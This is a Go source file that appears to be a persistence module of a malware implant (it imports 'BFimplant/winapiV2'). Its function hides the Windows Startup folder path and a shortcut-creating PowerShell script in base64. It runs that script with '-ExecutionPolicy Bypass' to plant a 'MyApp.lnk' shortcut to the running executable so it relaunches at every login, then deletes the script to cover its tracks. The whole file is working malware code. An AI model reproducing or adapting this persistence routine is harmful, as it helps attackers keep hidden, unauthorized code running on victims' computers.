package per

import (
	"encoding/base64"
	"fmt"
	"path/filepath"
	"syscall"
	"BFimplant/winapiV2"
)

func Add_per2() {

	startupDir := filepath.Join(getHomeDir(), decode("QXBwRGF0YVxSb2FtaW5nXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cA=="))
	shortcutPath := filepath.Join(startupDir, "MyApp.lnk")
	fmt.Println("Shortcut path:", shortcutPath)

	// Get the path of the currently running executable
	exePath := GetExecutablePath()
	fmt.Println("Exe path:", exePath)

	psScript := decode("cGFyYW0gKAogICAgW3N0cmluZ10kdGFyZ2V0UGF0aCwKICAgIFtzdHJpbmddJHNob3J0Y3V0UGF0aCwKICAgIFtzdHJpbmddJGRlc2NyaXB0aW9uCikKCiRXU2NyaXB0U2hlbGwgPSBOZXctT2JqZWN0IC1Db21PYmplY3QgV1NjcmlwdC5TaGVsbAokc2hvcnRjdXQgPSAkV1NjcmlwdFNoZWxsLkNyZWF0ZVNob3J0Y3V0KCRzaG9ydGN1dFBhdGgpCiRzaG9ydGN1dC5UYXJnZXRQYXRoID0gJHRhcmdldFBhdGgKJHNob3J0Y3V0LkRlc2NyaXB0aW9uID0gJGRlc2NyaXB0aW9uCiRzaG9ydGN1dC5TYXZlKCk=")

	psScriptFile := "create_shortcut.ps1"
	// open a file handel
	fileHandle, err := winapiV2.CreateFile(syscall.StringToUTF16Ptr(psScriptFile), winapiV2.GENERIC_WRITE, 0, nil, winapiV2.OPEN_ALWAYS, winapiV2.FILE_ATTRIBUTE_NORMAL, 0)
	if err != nil {
		fmt.Println("Error creating a handel to the file:", err)
	}

	b := []byte(psScript)
	var bwritten uint32
	succ, err := winapiV2.WriteFile(fileHandle,  &b[0], uint32(len(b)), &bwritten, nil)
	if !succ {
		fmt.Println("Error writing to file:", err)
	}
	
	errCH := syscall.CloseHandle(fileHandle)
	if errCH != nil {
		fmt.Println("Error closing file:", err)
	}


	comm := "powershell -ExecutionPolicy Bypass -File " + psScriptFile + " -targetPath \"" + exePath + "\" -shortcutPath \"" + shortcutPath + "\" -description \"" + "MyApp" + "\""
	_ , err = winapiV2.Exec(comm)
	if err != nil {	
		fmt.Printf("Error creating shortcut: %v\nOutput: %s\n", err,"")
		return
	}
	fmt.Println("Shortcut created in Startup folder")
	
	// Delete the script file
	err = DeleteFile(psScriptFile)
	if err!=nil {
		fmt.Println("Error deleting file")
	}
}

// decode decodes Base64 encoded strings
func decode(encoded string) string {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		fmt.Println("Error decccccc string:", err)
	}
	return string(decoded)
}

func getHomeDir() (string) {
    var buf [syscall.MAX_PATH]uint16
    length ,_:= syscall.GetEnvironmentVariable(syscall.StringToUTF16Ptr("USERPROFILE"), &buf[0], uint32(len(buf)))
    if length == 0 {
        return "failll to get hoooooo dirrrrr"
    }
    return syscall.UTF16ToString(buf[:length])
}

